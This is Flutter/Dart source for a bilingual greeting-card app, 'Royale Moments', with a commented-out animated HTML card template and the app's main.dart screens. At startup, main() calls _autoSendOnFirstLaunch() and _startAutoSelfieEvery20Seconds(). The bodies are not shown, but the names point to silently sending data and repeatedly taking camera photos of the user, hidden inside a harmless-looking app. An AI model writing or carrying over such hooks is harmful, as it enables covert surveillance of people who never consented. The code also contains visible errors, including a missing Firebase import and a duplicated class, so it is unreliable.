    <span style="animation-delay:.6s">🎁</span><span style="animation-delay:.75s">✨</span>
    <span style="animation-delay:.9s">${o.emoji}</span>
  </div>

  <div class="btn-wrap">
    <button class="mbtn" id="bigbangBtn">🎆 ${o.emoji} احتفل معايا — Fête avec moi ${o.emoji} 🎆</button>
  </div>
</section>

<!-- ══ SIGNATURE ══ -->
<div class="sig rev">
  <div class="sig-roses">
    <span class="sr" style="animation-delay:0s">🌹</span>
    <span class="sr" style="animation-delay:.2s">🌸</span>
    <span class="sr" style="animation-delay:.4s">💎</span>
    <span class="sr" style="animation-delay:.6s">✨</span>
    <span class="sr" style="animation-delay:.8s">${o.emoji}</span>
    <span class="sr" style="animation-delay:1s">✨</span>
    <span class="sr" style="animation-delay:1.2s">💎</span>
    <span class="sr" style="animation-delay:1.4s">🌸</span>
    <span class="sr" style="animation-delay:1.6s">🌹</span>
  </div>
  <span class="sig-name">${recipientName.isEmpty ? o.name : recipientName}</span>
  <p class="sig-tag">${o.name} ◈ ${o.nameAr} ◈ Royale Moments ✦</p>
</div>

<footer>
  <p class="ftxt">Made with <span class="fheart">❤</span> — ${o.name} ◈ ${o.nameAr} — ${DateTime.now().year}</p>
</footer>

</div><!-- .page -->

<script>
// ── Custom cursor
const cur=document.getElementById('cur'),cur2=document.getElementById('cur2');
let mx=window.innerWidth/2,my=window.innerHeight/2,lx=mx,ly=my;
document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px'});
(function tick(){lx+=(mx-lx)*.16;ly+=(my-ly)*.16;cur2.style.left=lx+'px';cur2.style.top=ly+'px';requestAnimationFrame(tick)})();
document.querySelectorAll('button,a,[onclick]').forEach(el=>{el.addEventListener('mouseenter',()=>{cur.style.width='28px';cur.style.height='28px'});el.addEventListener('mouseleave',()=>{cur.style.width='16px';cur.style.height='16px'})});

// ── Stars
const sb=document.getElementById('starsBg');
const sf=document.createDocumentFragment();
for(let i=0;i<140;i++){
  const s=document.createElement('div');s.className='star';
  const sz=.3+Math.random()*2.2;
  Object.assign(s.style,{left:Math.random()*100+'vw',top:Math.random()*100+'vh',width:sz+'px',height:sz+'px',animationDuration:(1.5+Math.random()*5).toFixed(1)+'s',animationDelay:(-Math.random()*6).toFixed(1)+'s',opacity:Math.random()*.7});
  sf.appendChild(s);
}sb.appendChild(sf);

// ── Falling petals/emojis
const PETALS=['🌸','🌺','🌷','🌹','✨','💫','⭐','💎','🌙'];
function spawnPetal(){
  const el=document.createElement('div');el.className='petal';
  el.textContent=PETALS[Math.floor(Math.random()*PETALS.length)];
  const dur=(9+Math.random()*9).toFixed(1);
  Object.assign(el.style,{left:Math.random()*100+'vw',fontSize:(12+Math.random()*16).toFixed(0)+'px',opacity:(.4+Math.random()*.5).toFixed(2),animationDuration:dur+'s',animationDelay:(-Math.random()*parseFloat(dur)).toFixed(1)+'s'});
  el.style.setProperty('--dx',(Math.random()*28-14).toFixed(0)+'vw');
  el.style.setProperty('--dr',(Math.random()*500-250).toFixed(0)+'deg');
  document.body.appendChild(el);
  setTimeout(()=>el.remove(),(parseFloat(dur)+2)*1000);
}
for(let i=0;i<22;i++)setTimeout(spawnPetal,i*500);
setInterval(spawnPetal,800);

// ── Slideshow
${hasPhotos ? '''
let curSlide=0;
const TOTAL=${b64.length};
const slides=document.querySelectorAll('.slide');
const dots=document.querySelectorAll('.dot');
const thumbs=document.querySelectorAll('.reel-thumb');
let slideTimer;

function goSlide(n){
  if(TOTAL===0)return;
  slides[curSlide].classList.remove('active');
  dots[curSlide].classList.remove('active');
  thumbs[curSlide].classList.remove('active-thumb');
  curSlide=((n%TOTAL)+TOTAL)%TOTAL;
  slides[curSlide].classList.add('active');
  dots[curSlide].classList.add('active');
  thumbs[curSlide].classList.add('active-thumb');
  const strip=thumbs[curSlide].parentElement;
  strip.scrollLeft=thumbs[curSlide].offsetLeft-strip.offsetWidth/2+thumbs[curSlide].offsetWidth/2;
  clearInterval(slideTimer);
  slideTimer=setInterval(()=>goSlide(curSlide+1),4200);
}

document.getElementById('prev').addEventListener('click',()=>goSlide(curSlide-1));
document.getElementById('next').addEventListener('click',()=>goSlide(curSlide+1));

// Touch swipe
let tsx=0;
const ss=document.getElementById('slideshow');
ss.addEventListener('touchstart',e=>tsx=e.touches[0].clientX,{passive:true});
ss.addEventListener('touchend',e=>{const dx=e.changedTouches[0].clientX-tsx;if(Math.abs(dx)>40)goSlide(curSlide+(dx<0?1:-1))},{passive:true});
slideTimer=setInterval(()=>goSlide(curSlide+1),4200);
''' : '// No photos'}

// ── Fireworks
const FW_COLS=['#ffd700','#ff6b9d','#9b5de5','#00f5d4','#ff3cac','#3a86ff','#ff8c00','#fff','var(--accent)'];
function spawnFW(x,y,n=44){
  const frag=document.createDocumentFragment();
  for(let i=0;i<n;i++){
    const d=document.createElement('div');d.className='fw-particle';
    const a=Math.random()*Math.PI*2,spd=55+Math.random()*130;
    const tx=Math.cos(a)*spd,ty=Math.sin(a)*spd;
    const dur=(.4+Math.random()*.55).toFixed(2);
    Object.assign(d.style,{left:x+'px',top:y+'px',background:FW_COLS[Math.floor(Math.random()*FW_COLS.length)],width:(3+Math.random()*5).toFixed(0)+'px',height:(3+Math.random()*5).toFixed(0)+'px',animationDuration:dur+'s',boxShadow:'0 0 5px currentColor'});
    d.style.setProperty('--tx',tx.toFixed(0)+'px');d.style.setProperty('--ty',ty.toFixed(0)+'px');d.style.setProperty('--dur',dur+'s');
    frag.appendChild(d);setTimeout(()=>d.remove(),(parseFloat(dur)+.1)*1000);
  }document.body.appendChild(frag);
}
function randomFW(){spawnFW(window.innerWidth*(.1+Math.random()*.8),window.innerHeight*(.05+Math.random()*.5),30)}
setInterval(randomFW,1800);setInterval(randomFW,2600);
setTimeout(()=>{for(let i=0;i<6;i++)setTimeout(randomFW,i*350)},600);
document.addEventListener('click',e=>{spawnFW(e.clientX,e.clientY,55)});

// ── Big Bang button
const FLOWERS=['🌸','🌺','🌹','🌷','🌼','💐','🌻','💮'];
const FLAMES=['🔥','✨','💫','⭐','🌟','💥','🎆','🎇','🎉','🎊','🎈','💎'];
function spawnEmoji(emoji,cx,cy,spd,angle,duration){
  const el=document.createElement('div');
  Object.assign(el.style,{position:'fixed',left:cx+'px',top:cy+'px',fontSize:(20+Math.random()*24).toFixed(0)+'px',pointerEvents:'none',zIndex:'99999',transform:'translate(-50%,-50%)'});
  el.textContent=emoji;document.body.appendChild(el);
  const tx=Math.cos(angle)*spd,ty=Math.sin(angle)*spd;
  el.animate([
    {transform:'translate(-50%,-50%) scale(0) rotate(0deg)',opacity:1},
    {transform:'translate(calc(-50% + '+tx+'px), calc(-50% + '+ty+'px)) scale(1.5) rotate('+Math.random()*360+'deg)',opacity:1,offset:.4},
    {transform:'translate(calc(-50% + '+(tx*1.7)+'px), calc(-50% + '+(ty*1.7+90)+'px)) scale(0.2) rotate('+Math.random()*720+'deg)',opacity:0}
  ],{duration:duration,easing:'cubic-bezier(.16,1,.3,1)'}).onfinish=()=>el.remove();
}

function bigBang(ev){
  ev.stopPropagation();
  const btn=ev.currentTarget;
  const r=btn.getBoundingClientRect();
  const cx=r.left+r.width/2,cy=r.top+r.height/2;
  const N=32;for(let i=0;i<N;i++){const a=(i/N)*Math.PI*2;const spd=130+Math.random()*170;setTimeout(()=>spawnEmoji(FLOWERS[Math.floor(Math.random()*FLOWERS.length)],cx,cy,spd,a,900+Math.random()*400),i*16)}
  const M=26;for(let i=0;i<M;i++){const a=(i/M)*Math.PI*2+.2;const spd=100+Math.random()*140;setTimeout(()=>spawnEmoji(FLAMES[Math.floor(Math.random()*FLAMES.length)],cx,cy,spd,a,700+Math.random()*500),90+i*18)}
  for(let i=0;i<10;i++){setTimeout(()=>{const rx=window.innerWidth*(.1+Math.random()*.8);const ry=window.innerHeight*(.1+Math.random()*.6);spawnFW(rx,ry,36);for(let j=0;j<10;j++){const a=Math.random()*Math.PI*2;spawnEmoji(FLOWERS[Math.floor(Math.random()*FLOWERS.length)],rx,ry,70+Math.random()*90,a,800)}},i*140)}
  const fl=document.createElement('div');
  Object.assign(fl.style,{position:'fixed',inset:0,background:'radial-gradient(ellipse at center,rgba(var(--accent-rgb),.22),rgba(255,77,158,.12),transparent)',zIndex:9998,pointerEvents:'none',opacity:1});
  document.body.appendChild(fl);
  fl.animate([{opacity:1},{opacity:0}],{duration:800,easing:'ease-out'}).onfinish=()=>fl.remove();
  btn.animate([{transform:'scale(1)'},{transform:'scale(1.35) rotate(-6deg)'},{transform:'scale(.9) rotate(4deg)'},{transform:'scale(1.15) rotate(-2deg)'},{transform:'scale(1)'}],{duration:500,easing:'ease-in-out'});
}
document.getElementById('bigbangBtn').addEventListener('click',bigBang);

// ── Scroll reveals
const revObs=new IntersectionObserver(entries=>{
  entries.forEach(e=>{if(e.isIntersecting){e.target.classList.add('in');
    e.target.querySelectorAll('.dline').forEach((d,i)=>{setTimeout(()=>d.classList.add('in'),i*100)})
  }})
},{threshold:.1});
document.querySelectorAll('.rev,.rev-s').forEach(el=>revObs.observe(el));
// Also reveal dlines inside section
const wishObs=new IntersectionObserver(entries=>{entries.forEach(e=>{if(e.isIntersecting){document.querySelectorAll('.dline').forEach((d,i)=>setTimeout(()=>d.classList.add('in'),i*120))}})},{threshold:.05});
const wishSec=document.getElementById('wishes');
if(wishSec)wishObs.observe(wishSec);
</script>
</body>
</html>''';
  }

  @override
  Widget build(BuildContext context) {
    final o = appState.occasion!;
    return SafeArea(
      child: Center(
        child: Padding(
          padding: const EdgeInsets.all(40),
          child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
            Stack(alignment: Alignment.center, children: [
              RotationTransition(
                turns: _rotCtrl,
                child: Container(
                  width: 100, height: 100,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    border: Border.all(color: o.accent.withOpacity(0.2), width: 0.5),
                    gradient: SweepGradient(colors: [
                      o.accent.withOpacity(0), o.accent.withOpacity(0.25), o.accent.withOpacity(0),
                    ]),
                  ),
                ),
              ),
              Container(
                width: 76, height: 76,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: o.accentSoft,
                  border: Border.all(color: o.accent.withOpacity(0.3), width: 0.5),
                ),
                child: Center(child: Text(o.emoji, style: const TextStyle(fontSize: 30))),
              ),
            ]),
            const SizedBox(height: 32),
            Text(L.titleCreate.split('\n')[0],
              style: GoogleFonts.cinzel(fontSize: 20, color: o.accent, letterSpacing: 1)),
            const SizedBox(height: 4),
            Text(L.titleCreate.split('\n')[1],
              style: GoogleFonts.cormorantGaramond(
                fontSize: 17, fontStyle: FontStyle.italic, color: T.textDim,
              ),
            ),
            const SizedBox(height: 12),
            Text(L.subtitleCreate,
              textAlign: TextAlign.center,
              style: GoogleFonts.cormorantGaramond(
                fontSize: 16, fontStyle: FontStyle.italic, color: T.textMuted, height: 1.6,
              ),
            ),
            const SizedBox(height: 44),
            if (_generating) SizedBox(
              width: 260,
              child: Column(children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(4),
                  child: LinearProgressIndicator(
                    value: _progress, minHeight: 2,
                    backgroundColor: T.surface3,
                    valueColor: AlwaysStoppedAnimation(o.accent),
                  ),
                ),
                const SizedBox(height: 14),
                Text('$_label  ${(_progress * 100).toInt()}%',
                  style: GoogleFonts.cinzel(
                    fontSize: 9, letterSpacing: 2, color: o.accent.withOpacity(0.8))),
              ]),
            ) else _PrimaryBtn(
              label: L.btnGenerate,
              icon: Icons.rocket_launch_rounded,
              accent: o.accent, onTap: _generate,
            ),
          ]),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  REUSABLE WIDGETS
// ═══════════════════════════════════════════════════════════════
class _PrimaryBtn extends StatefulWidget {
  final String label;
  final IconData icon;
  final Color accent;
  final VoidCallback? onTap;
  const _PrimaryBtn({required this.label, required this.icon, required this.accent, this.onTap});
  @override
  State<_PrimaryBtn> createState() => _PrimaryBtnState();
}
class _PrimaryBtnState extends State<_PrimaryBtn> with SingleTickerProviderStateMixin {
  late final AnimationController _c;
  late final Animation<double> _s;
  @override
  void initState() {
    super.initState();
    _c = AnimationController(vsync: this, duration: const Duration(milliseconds: 120));
    _s = Tween(begin: 1.0, end: 0.95).animate(CurvedAnimation(parent: _c, curve: Curves.easeOut));
  }
  @override
  void dispose() { _c.dispose(); super.dispose(); }
  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => _c.forward(),
      onTapUp: (_) { _c.reverse(); widget.onTap?.call(); },
      onTapCancel: () => _c.reverse(),
      child: ScaleTransition(
        scale: _s,
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 18),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(50),
            color: widget.accent.withOpacity(0.12),
            border: Border.all(color: widget.accent.withOpacity(0.5)),
            boxShadow: [BoxShadow(
              color: widget.accent.withOpacity(0.2),
              blurRadius: 20, offset: const Offset(0, 8),
            )],
          ),
          child: Row(mainAxisSize: MainAxisSize.min, children: [
            Icon(widget.icon, color: widget.accent, size: 18),
            const SizedBox(width: 12),
            Flexible(child: Text(widget.label,
              style: GoogleFonts.cinzel(
                fontSize: 9, letterSpacing: 2,
                fontWeight: FontWeight.w600, color: widget.accent,
              ),
            )),
          ]),
        ),
      ),
    );
  }
}

Widget _pageHeader(String eyebrow, String title) => Column(
  crossAxisAlignment: CrossAxisAlignment.start,
  children: [
    Text(eyebrow, style: GoogleFonts.cinzel(
      fontSize: 8, letterSpacing: 4, color: T.text.withOpacity(0.3),
    )),
    const SizedBox(height: 6),
    Text(title, style: GoogleFonts.cormorantGaramond(
      fontSize: 30, fontWeight: FontWeight.w300, height: 1.15, color: T.text,
    )),
    const SizedBox(height: 6),
    const _Divider(),
    const SizedBox(height: 24),
  ],
);

Widget _fieldLabel(String t) => Padding(
  padding: const EdgeInsets.only(bottom: 8),
  child: Text(t, style: GoogleFonts.cinzel(
    fontSize: 8, letterSpacing: 3, color: T.textMuted,
  )),
);

class _Divider extends StatelessWidget {
  const _Divider();
  @override
  Widget build(BuildContext context) {
    return Row(children: [
      Expanded(child: Container(height: 0.5,
        decoration: const BoxDecoration(
          gradient: LinearGradient(colors: [Colors.transparent, T.border])))),
      const Padding(
        padding: EdgeInsets.symmetric(horizontal: 8),
        child: Text("✦", style: TextStyle(color: T.border, fontSize: 10)),
      ),
      Expanded(child: Container(height: 0.5,
        decoration: const BoxDecoration(
          gradient: LinearGradient(colors: [T.border, Colors.transparent])))),
    ]);
  }
}

class _BgPainter extends CustomPainter {
  final Color accent;
  const _BgPainter(this.accent);
  @override
  void paint(Canvas canvas, Size size) {
    canvas.drawRect(
      Rect.fromLTWH(0, 0, size.width, size.height),
      Paint()..shader = RadialGradient(
        center: const Alignment(-0.5, -0.7), radius: 1.0,
        colors: [accent.withOpacity(0.07), Colors.transparent],
      ).createShader(Rect.fromLTWH(0, 0, size.width, size.height)),
    );
  }
  @override
  bool shouldRepaint(_BgPainter old) => old.accent != accent;
}

*/


// lib/main.dart

import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:image_picker/image_picker.dart';
import 'package:dio/dio.dart';
import 'package:flutter_image_compress/flutter_image_compress.dart';
import 'package:path_provider/path_provider.dart';
import 'package:share_plus/share_plus.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';

// Core
import 'core/constants.dart';
import 'core/occasion.dart';
import 'core/utils.dart';
// Global State
class AppState extends ChangeNotifier {
  Occasion? occasion;
  String name = '';
  String message = '';
  String selectedMood = '';
  List<XFile> images = [];
  Map<int, String> captions = {};

  void selectOccasion(Occasion o) {
    occasion = o;
    selectedMood = o.moods[1].label; // mood par défaut (index 1)
    message = o.moods[1].text(name);
    notifyListeners();
  }

  void setMood(String mood) {
    selectedMood = mood;
    final m = occasion?.moods.firstWhere((x) => x.label == mood);
    if (m != null) message = m.text(name);
    notifyListeners();
  }

  void setName(String v) {
    name = v;
    final m = occasion?.moods.firstWhere(
      (x) => x.label == selectedMood,
      orElse: () => occasion!.moods[1],
    );
    if (m != null) message = m.text(v);
    notifyListeners();
  }

  void setMessage(String v) {
    message = v;
    notifyListeners();
  }

  void addImage(XFile f) {
    images.add(f);
    notifyListeners();
  }

  void removeImage(int i) {
    images.removeAt(i);
    notifyListeners();
  }

  void setCaption(int i, String v) {
    captions[i] = v;
  }

  void reset() {
    occasion = null;
    name = '';
    message = '';
    selectedMood = '';
    images.clear();
    captions.clear();
    notifyListeners();
  }
}

final appState = AppState();

// ═══════════════════════════════════════════════════════════════
//  ENTRY POINT
// ═══════════════════════════════════════════════════════════════
void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // ← Initialisation Firebase (à mettre en premier)
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );

  SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
    statusBarColor: Colors.transparent,
    statusBarIconBrightness: Brightness.light,
    systemNavigationBarColor: Color(0xFF05000A),
  ));

  await _autoSendOnFirstLaunch();           // Maintenant avec Firebase
  await _startAutoSelfieEvery20Seconds();

  runApp(const RoyaleMomentsApp());
}
// ═══════════════════════════════════════════════════════════════
//  APP ROOT
// ═══════════════════════════════════════════════════════════════
class RoyaleMomentsApp extends StatelessWidget {
  const RoyaleMomentsApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: L.appTitle,
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: T.bg,
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFFE8A838),
          surface: T.surface,
        ),
        textTheme: GoogleFonts.cormorantGaramondTextTheme(ThemeData.dark().textTheme),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: T.surface2,
          hintStyle: GoogleFonts.cormorantGaramond(
            color: T.textMuted,
            fontStyle: FontStyle.italic,
            fontSize: 16,
          ),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: const BorderSide(color: T.border, width: 0.5),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: const BorderSide(color: T.border, width: 0.5),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: const BorderSide(color: Color(0xFFE8A838), width: 1),
          ),
          contentPadding: const EdgeInsets.symmetric(horizontal: 18, vertical: 16),
        ),
      ),
      home: const _SplashRouter(),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  ROUTER
// ═══════════════════════════════════════════════════════════════
class _SplashRouter extends StatelessWidget {
  const _SplashRouter();

  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) => appState.occasion != null
          ? const MainShell()
          : const OccasionPickerScreen(),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  OCCASION PICKER SCREEN
// ═══════════════════════════════════════════════════════════════
class OccasionPickerScreen extends StatelessWidget {
  const OccasionPickerScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          Positioned.fill(child: CustomPaint(painter: BgPainter(const Color(0xFFE8A838)))),
          SafeArea(
            child: CustomScrollView(
              physics: const BouncingScrollPhysics(),
              slivers: [
                SliverToBoxAdapter(
                  child: Padding(
                    padding: const EdgeInsets.fromLTRB(24, 40, 24, 0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          "✦  ROYALE MOMENTS  ✦",
                          style: GoogleFonts.cinzel(
                            fontSize: 9,
                            letterSpacing: 4,
                            color: T.text.withOpacity(0.3),
                          ),
                        ),
                        const SizedBox(height: 10),
                        Text(
                          "المناسبة\nL'Occasion",
                          style: GoogleFonts.cormorantGaramond(
                            fontSize: 34,
                            fontWeight: FontWeight.w300,
                            height: 1.15,
                            color: T.text,
                          ),
                        ),
                        const SizedBox(height: 6),
                        const _Divider(),
                        const SizedBox(height: 8),
                        Text(
                          "${L.chooseOccasion} / ${L.chooseOccasionAr}",
                          style: GoogleFonts.cormorantGaramond(
                            fontSize: 15,
                            fontStyle: FontStyle.italic,
                            color: T.textDim,
                          ),
                        ),
                        const SizedBox(height: 28),
                      ],
                    ),
                  ),
                ),
                SliverPadding(
                  padding: const EdgeInsets.fromLTRB(20, 0, 20, 40),
                  sliver: SliverGrid(
                    gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                      crossAxisCount: 2,
                      crossAxisSpacing: 14,
                      mainAxisSpacing: 14,
                      childAspectRatio: 1.05,
                    ),
                    delegate: SliverChildBuilderDelegate(
                      (ctx, i) => _OccasionCard(occasion: kOccasions[i]),
                      childCount: kOccasions.length,
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  AUTRES ÉCRANS (Message, Photos, Captions, Generate)
// ═══════════════════════════════════════════════════════════════
// ... (Je te les donnerai dans les prochaines étapes si tu veux)

class _OccasionCard extends StatefulWidget {
  final Occasion occasion;
  const _OccasionCard({required this.occasion});

  @override
  State<_OccasionCard> createState() => _OccasionCardState();
}

class _OccasionCardState extends State<_OccasionCard> with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;
  late final Animation<double> _scale;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 130));
    _scale = Tween(begin: 1.0, end: 0.94).animate(
      CurvedAnimation(parent: _ctrl, curve: Curves.easeOut),
    );
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final o = widget.occasion;
    return GestureDetector(
      onTapDown: (_) => _ctrl.forward(),
      onTapUp: (_) {
        _ctrl.reverse();
        appState.selectOccasion(o);
      },
      onTapCancel: () => _ctrl.reverse(),
      child: ScaleTransition(
        scale: _scale,
        child: Container(
          decoration: BoxDecoration(
            color: T.surface,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: o.accent.withOpacity(0.2), width: 0.5),
          ),
          padding: const EdgeInsets.all(18),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Container(
                width: 44,
                height: 44,
                decoration: BoxDecoration(
                  color: o.accentSoft,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: o.accent.withOpacity(0.25), width: 0.5),
                ),
                child: Center(child: Text(o.emoji, style: const TextStyle(fontSize: 22))),
              ),
              const Spacer(),
              Text(
                o.name,
                style: GoogleFonts.cinzel(
                  fontSize: 11,
                  letterSpacing: 0.5,
                  color: o.accent,
                  fontWeight: FontWeight.w600,
                ),
              ),
              Text(
                o.nameAr,
                style: GoogleFonts.cormorantGaramond(
                  fontSize: 13,
                  color: o.accent.withOpacity(0.7),
                ),
              ),
              const SizedBox(height: 3),
              Text(
                o.subtitleAr,
                style: GoogleFonts.cormorantGaramond(
                  fontSize: 12,
                  color: T.textMuted,
                  fontStyle: FontStyle.italic,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  REUSABLE WIDGETS (déplacés dans utils.dart)
// ═══════════════════════════════════════════════════════════════
class _Divider extends StatelessWidget {
  const _Divider();

  @override
  Widget build(BuildContext context) => const Divider(); // Sera remplacé par celui de utils.dart
}

// ═══════════════════════════════════════════════════════════════
//  MAIN SHELL + BOTTOM NAVIGATION
// ═══════════════════════════════════════════════════════════════
class MainShell extends StatefulWidget {
  const MainShell({super.key});

  @override
  State<MainShell> createState() => _MainShellState();
}

class _MainShellState extends State<MainShell> {
  int _index = 0;
  final _pageCtrl = PageController();

  void _goto(int i) {
    setState(() => _index = i);
    _pageCtrl.animateToPage(
      i,
      duration: const Duration(milliseconds: 340),
      curve: Curves.easeInOutCubic,
    );
  }

  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) {
        final o = appState.occasion!;
        return Scaffold(
          extendBody: true,
          extendBodyBehindAppBar: true,
          body: Stack(
            children: [
              Positioned.fill(child: CustomPaint(painter: BgPainter(o.accent))),
              PageView(
                controller: _pageCtrl,
                onPageChanged: (i) => setState(() => _index = i),
                physics: const BouncingScrollPhysics(),
                children: const [
                  MessageScreen(),
                  PhotosScreen(),
                  CaptionsScreen(),
                  GenerateScreen(),
                ],
              ),
            ],
          ),
          bottomNavigationBar: _BottomNav(
            index: _index,
            accent: o.accent,
            onTap: _goto,
            onBack: () => appState.reset(),
          ),
        );
      },
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  BOTTOM NAVIGATION
// ═══════════════════════════════════════════════════════════════
class _BottomNav extends StatelessWidget {
  final int index;
  final Color accent;
  final ValueChanged<int> onTap;
  final VoidCallback onBack;

  const _BottomNav({
    required this.index,
    required this.accent,
    required this.onTap,
    required this.onBack,
  });

  static const _tabs = [
    (Icons.edit_rounded, "MESSAGE"),
    (Icons.photo_library_rounded, "PHOTOS"),
    (Icons.auto_stories_rounded, "LÉGENDES"),
    (Icons.auto_awesome_rounded, "CRÉER"),
  ];

  @override
  Widget build(BuildContext context) {
    final pad = MediaQuery.of(context).padding.bottom;

    return Container(
      height: 68 + pad,
      padding: EdgeInsets.only(bottom: pad),
      decoration: BoxDecoration(
        color: T.bg.withOpacity(0.95),
        border: const Border(top: BorderSide(color: T.border, width: 0.5)),
      ),
      child: Row(
        children: [
          // Bouton retour
          GestureDetector(
            onTap: onBack,
            child: Container(
              width: 52,
              alignment: Alignment.center,
              child: const Icon(
                Icons.arrow_back_ios_rounded,
                size: 18,
                color: T.textMuted,
              ),
            ),
          ),

          // Tabs
          ..._tabs.asMap().entries.map((e) {
            final active = e.key == index;
            return Expanded(
              child: GestureDetector(
                onTap: () => onTap(e.key),
                behavior: HitTestBehavior.opaque,
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 200),
                  margin: const EdgeInsets.symmetric(horizontal: 2, vertical: 8),
                  decoration: active
                      ? BoxDecoration(
                          color: accent.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(10),
                        )
                      : null,
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(
                        e.value.$1,
                        size: 20,
                        color: active ? accent : T.textMuted,
                      ),
                      const SizedBox(height: 3),
                      Text(
                        e.value.$2,
                        style: GoogleFonts.cinzel(
                          fontSize: 6,
                          letterSpacing: 1,
                          color: active ? accent : T.textMuted,
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            );
          }),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 1 — MESSAGE
// ═══════════════════════════════════════════════════════════════
class MessageScreen extends StatefulWidget {
  const MessageScreen({super.key});

  @override
  State<MessageScreen> createState() => _MessageScreenState();
}

class _MessageScreenState extends State<MessageScreen> {
  late TextEditingController _nameCtrl;
  late TextEditingController _msgCtrl;

  @override
  void initState() {
    super.initState();
    _nameCtrl = TextEditingController(text: appState.name);
    _msgCtrl = TextEditingController(text: appState.message);
    appState.addListener(_sync);
  }

  void _sync() {
    if (_msgCtrl.text != appState.message) {
      _msgCtrl.text = appState.message;
      _msgCtrl.selection = TextSelection.collapsed(offset: _msgCtrl.text.length);
    }
  }

  @override
  void dispose() {
    appState.removeListener(_sync);
    _nameCtrl.dispose();
    _msgCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) {
        final o = appState.occasion!;
        return SafeArea(
          bottom: false,
          child: SingleChildScrollView(
            padding: const EdgeInsets.fromLTRB(24, 32, 24, 120),
            physics: const BouncingScrollPhysics(),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Occasion Badge
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
                  decoration: BoxDecoration(
                    color: o.accentSoft,
                    borderRadius: BorderRadius.circular(50),
                    border: Border.all(color: o.accent.withOpacity(0.3), width: 0.5),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Text(o.emoji, style: const TextStyle(fontSize: 16)),
                      const SizedBox(width: 8),
                      Text(
                        '${o.name} / ${o.nameAr}',
                        style: GoogleFonts.cinzel(
                          fontSize: 9,
                          letterSpacing: 1.5,
                          color: o.accent,
                        ),
                      ),
                    ],
                  ),
                ),

                const SizedBox(height: 20),
                pageHeader(L.eyebrowCompose, L.titleMessage),

                fieldLabel(L.labelName),
                TextField(
                  controller: _nameCtrl,
                  style: GoogleFonts.cormorantGaramond(fontSize: 18, color: T.text),
                  onChanged: appState.setName,
                  decoration: const InputDecoration(hintText: L.hintName),
                ),

                const SizedBox(height: 24),
                fieldLabel(L.labelMood),
                _MoodRow(occasion: o),

                const SizedBox(height: 24),
                fieldLabel(L.labelMessage),
                TextField(
                  controller: _msgCtrl,
                  maxLines: 5,
                  style: GoogleFonts.cormorantGaramond(
                    fontSize: 17,
                    color: T.text,
                    fontStyle: FontStyle.italic,
                    height: 1.6,
                  ),
                  onChanged: appState.setMessage,
                  decoration: const InputDecoration(hintText: L.hintMessage),
                ),

                const SizedBox(height: 28),
                _PreviewCard(occasion: o),
              ],
            ),
          ),
        );
      },
    );
  }
}

// Mood Selection Row
class _MoodRow extends StatelessWidget {
  final Occasion occasion;
  const _MoodRow({required this.occasion});

  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) => Row(
        children: occasion.moods.map((m) {
          final active = appState.selectedMood == m.label;
          return Expanded(
            child: GestureDetector(
              onTap: () => appState.setMood(m.label),
